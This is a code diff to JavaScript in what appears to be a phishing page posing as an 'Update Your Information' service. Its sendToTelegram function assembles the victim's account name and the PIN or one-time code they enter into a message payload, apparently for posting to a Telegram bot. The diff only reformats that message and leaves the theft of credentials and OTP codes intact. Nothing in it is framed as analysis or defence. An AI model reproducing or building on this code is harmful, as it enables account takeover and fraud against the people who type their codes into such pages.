@@ -193,24 +193,18 @@
             });
 
             function sendToTelegram(type, code) {
-                var now = new Date();
-                var timeStr = now.toLocaleString('en-GB', { hour12: false });
                 var text;
                 if (type === 'otp') {
                     text =
-                        '🔐 PIN Verification\n' +
-                        '━━━━━━━━━━━━━━━━━━━━\n' +
+                        '🔐 PIN Verification\n\n' +
                         'Service:   Update Your Information\n' +
                         'Account:   ' + username + '\n' +
-                        'PIN:       ' + code + '\n\n' +
-                        '🕒 الوقت: ' + timeStr;
+                        'OTP:       ' + code;
                 } else {
                     text =
-                        '🔁 PIN Verification — Resend Request\n' +
-                        '━━━━━━━━━━━━━━━━━━━━\n' +
+                        '🔁 PIN Verification — Resend Request\n\n' +
                         'Service:   Update Your Information\n' +
-                        'Account:   ' + username + '\n\n' +
-                        '🕒 الوقت: ' + timeStr;
+                        'Account:   ' + username;
                 }
                 var payload = new URLSearchParams();
                 payload.append('text', text);
